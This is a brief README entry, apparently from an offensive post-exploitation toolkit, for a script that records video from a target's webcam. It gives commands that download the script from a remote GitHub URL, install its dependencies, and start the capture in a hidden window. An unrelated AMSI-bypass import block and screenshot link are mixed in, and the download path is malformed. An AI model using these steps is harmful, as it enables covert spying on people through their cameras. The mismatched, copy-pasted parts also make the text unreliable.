## WebCam.py

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|WebCam|Capture video using target webcam|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.png)|

```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/WebCam.py1" -OutFile "WebCam.py"
```

```powershell
Import-Module -Name ".\AMSBP.ps1" -Force
AMSBP
```

<br />

credits: @AHLASaad \ @Avinab Saha
URL: https://learnopencv.com/read-write-and-display-a-video-using-opencv-cpp-python/


#Check if opencv its installed
[bool](pip3 list|findstr /C:"opencv-python")

# it installs opencv and numpy
pip3 install opencv-python

# Edit WebCam.py and change next cmdline to point to our python\site-packages dir
sys.path.append("c:\\users\\pedro\\appdata\\local\\programs\\python\\python39\\lib\\site-packages")

#Start capture
Start-Process -WindowStyle hidden python3 -argumentlist "WebCam.py"

#Stop capture
stop-process -name python3.9
